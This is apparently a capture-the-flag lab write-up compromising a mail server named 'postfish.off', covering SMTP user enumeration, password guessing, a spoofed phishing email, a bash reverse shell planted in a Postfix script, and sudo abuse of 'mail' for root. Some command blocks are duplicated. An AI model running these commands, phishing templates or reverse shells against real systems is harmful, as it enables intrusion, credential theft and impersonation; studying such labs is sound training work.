Performing an aggressive TCP port scan using the command sudo nmap -sV -A 192.168.110.137 -p 22,25,80,110,143,993,995 returns the output shown above. The target machine is running the SSH application OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 on port 22. The web server application is Apache httpd 2.4.41 on port 80. On most of the ports, the application Dovecot is run. However, on port 25 the SMTP application Postfix is active. From the scan output above, the scan also obtained the string postfish.off. Is this the hostname? This looks correct as the string Service Info: Host: postfish.off is also output. I will enumerate the web application first.

Enumeration

Port 80: HTTP

The webpage shown in the picture above is returned for this web application on port 80. Browsing to this web application redirects me to http://postfish.off. Time to add this hostname inside my /etc/hosts file.


I added the entry 192.168.110.137 postfish.off inside my /etc/hosts file. Then I refreshed the website, and the webpage shown in the picture above is returned. I enumerated the source code of the webpage, but I didn't find anything useful. I notice there is one more page: Our team. Time to check this out.


Before performing any directory search, I decided to check out the Our team page from the header of the website. And the webpage shown in the picture above is returned to me. In this page I obtained the names of the employees: Claire Madison, Mike Ross, Brian Moore, and Sarah Lorem. I performed a directory search using multiple wordlists, but I had no luck. The only other applications I can enumerate are the POP3 and SMTP. Since I have the names of the employees, I can enumerate the mail applications.

Port 25: SMTP


On my machine, I created a text file by the name team-names.txt that contains the entries shown in the image above. These are the names of the employees. Earlier, I identified the hostname is postfish.off. This could be the domain part of the email. But what is the username convention used by the company?


I cloned the username-anarchy repository from here. After setting it up, I ran the command ./username-anarchy -i team-names.txt > usernames.txt. Afterwards, I obtained the possible username convention for all names. In the image above, I only showed the snippet of the usernames. In total, there are fifty-eight entries. Time to fire these against the SMTP application on port 25. To enumerate email services, it is possible to use different commands such as VRFY, EXPN, or RCPT. But from previous enumeration, I identified one of the available commands is VRFY according to the smtp-commands. This can be abused to identify the potential users and even the username convention used by the company. Tools such as smtp-user-enum can be used to automate this. Once the usernames are identified, tools such as hydra can be used to bruteforce their password.


I ran the command smtp-user-enum -M VRFY -U usernames.txt -t postfish.off -D postfish.off and obtained the result shown in the image above. This tool successfully identified the username convention, which is firstname.lastname, and the usernames:

claire.madison@postfish.off
mike.ross@postfish.off
brian.moore@postfish.off
sarah.lorem@postfish.off
claire.madison@postfish.off
mike.ross@postfish.off
brian.moore@postfish.off
sarah.lorem@postfish.off

I saved the output above to a file called valid-usernames.txt on my machine. Time to bruteforce their password using hydra. I tried to bruteforce the password of the four users, but I had no luck. Time to enumerate harder. I even tried to obtain the possible passwords from the strings using cewl, but I had no luck.



Using the tool cewl and the command cewl -d 3 -m 3 -w team-page-keywords.txt http://postfish.off, I created a wordlist file using the words from the website. In total, the tool compiled 116 words. The minimum word length is three. The depth of the search is also set to three. Then running the command smtp-user-enum -M VRFY -U team-page-keywords.txt -t postfish.off , I obtained a hit on two more usernames: sales and legal. It looks like the departments have their own email addresses too, which I completely missed.


Before bruteforcing using rockyou.txt, I checked to see if sales and legal usernames have default passwords then I got a hit. I ran the command hydra -L departments.txt -f postfish.off pop3 -I -e nsr and obtained the valid credentials sales:sales as shown in the image above.

Exploitation

Exploitation: Spearphising brian.moore via Email to Obtain Credentials

I also ran the command curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd and obtained it is valid account. Then using the tool Evolution, I signed in using the credentials sales:sales. The username has to be sales@postfish.off; otherwise, it will not work. Then I notice there is one email from it@postfish.off. The content of this email is shown in the image above. The email content is the following:

Hi Sales team,

We will be sending out password reset links in the upcoming week so that we can get you registered on the ERP system.

Regards,
IT
Hi Sales team,

We will be sending out password reset links in the upcoming week so that we can get you registered on the ERP system.

Regards,
IT

It seems like the email is sent by the IT department to the members of the Sales department. The head of IT department is Mike Ross from previous enumeration. Also, the user Brian Moore belongs to the group Sales department. Since password links are being sent out, the potential attack vector is spearphising. For example, I can compose a spearphishing email to Brian Moore whose email is brian.moore@postfish.off. Obviously composing a spearphising email using sales@postfish.off email will look invalid. Since SMTP is already open on port 25, I can use this to compose the email.


I started a listener on my machine first at port 80 using the command sudo nc -lvnp 80. Then using the command telnet postfish.off 25, I connected to the SMTP application on the target machine at port 25. To send an email, I will have to use the commands. After connecting, I ran the following commands to compose the spearphising email:

HELO it
EHLO it
MAIL FROM: it@postfish.off
RCPT TO: brian.moore@postfish.off
DATA
Subject: ERP Password Reset Link

Dear Brian,

The ERP system is active and running now. Here is your password reset link: http://192.168.45.167

Regards,
IT Department

.
QUIT
HELO it
EHLO it
MAIL FROM: it@postfish.off
RCPT TO: brian.moore@postfish.off
DATA
Subject: ERP Password Reset Link

Dear Brian,

The ERP system is active and running now. Here is your password reset link: http://192.168.45.167

Regards,
IT Department

.
QUIT

The composed email shown in the output above is self explanatory. The HELO it and EHLO it are used to connect to the SMTP application. The MAIL FROM: it@postfish.off is used to ensure our spearphising email looks like it is sent by the user it@postfish.off. Then RCPT TO: brian.moore@postfish.off is used to target the Brian Moore user who is also the head of the Sales department. Everthing after DATA up to . is the content of the email. Inside the email content, the reset link points to my listener on my machine at port 80. If the user Brian Moore clicks the link, it could send me some information such as credentials. Then the command QUIT is used to terminate the SMTP session with the target machine.


And after some time, I obtained the request shown in the image above. I successfully obtained the password EternaLSunshinE belonging to the user brian.moore@postfish.off. I tried to connect to the email service using the new credentials brian.moore:EternaLSunshinE, but I had no luck. However, the SSH is open on port 22.


And bingo. I connected to the SSH application on the target machine using the command ssh brian.moore@postfish.off and the password EternaLSunshinE and got a hit as shown in the image above. Now I have an SSH foothold on the target machine as the user brian.moore.

Privilege Escalation

Horizontal Privilege Escalation: User brian.moore to User filter via Binary /etc/postfix/disclaimer Abuse

After some manual enumeration, I couldn't find anything. I transferred linpeas to the target machine and obtained the result shown in the image above. As shown in the image above, the file disclaimer located at /etc/postfix shows it is readable by the group members of filter group.


Running the command cat /etc/postfix/disclaimer shows it is a bash script, as shown in the image above. I notice I can edit this script as the current user brian.moore belongs to the group filter. Can I insert a reverse shell inside it?


I inserted the bash reverse shell command /bin/bash -i >& /dev/tcp/192.168.45.167/25 0>&1 inside the /etc/postfix/disclaimer file, as shown in the image above. Then I started a listener on my machine at port 25. This script is invoked when an email is sent. To invoke the reverse shell, I will need to send a test email.


On my machine, I connected to the SMTP application and sent a test email using the following commands:

HELO it                                                                    
EHLO it                                                                                         
MAIL FROM: it@postfish.off                                                                     
RCPT TO: it@postfish.off                                                                        
DATA                                                                                            
test                                                                                            
.
quit
HELO it                                                                    
EHLO it                                                                                         
MAIL FROM: it@postfish.off                                                                     
RCPT TO: it@postfish.off                                                                        
DATA                                                                                            
test                                                                                            
.
quit

And bingo. After some time, I obtained a reverse shell connection on my machine at port 25 as shown in the image above on the terminal on the left. Now I have a shell session as the user filter.

Vertical Privilege Escalation: User filter to User root via sudo Abuse Using mail

Running the command sudo -l outputs the entry (ALL) NOPASSWD: /usr/bin/mail *. The binary mail can be executed as the user root without having to enter password. This can be abused to open a root shell now.


And to open a root shell, I ran the command sudo /usr/bin/mail --exec='!/bin/sh'. Now I have a root shell on the target machine as shown in the image above.
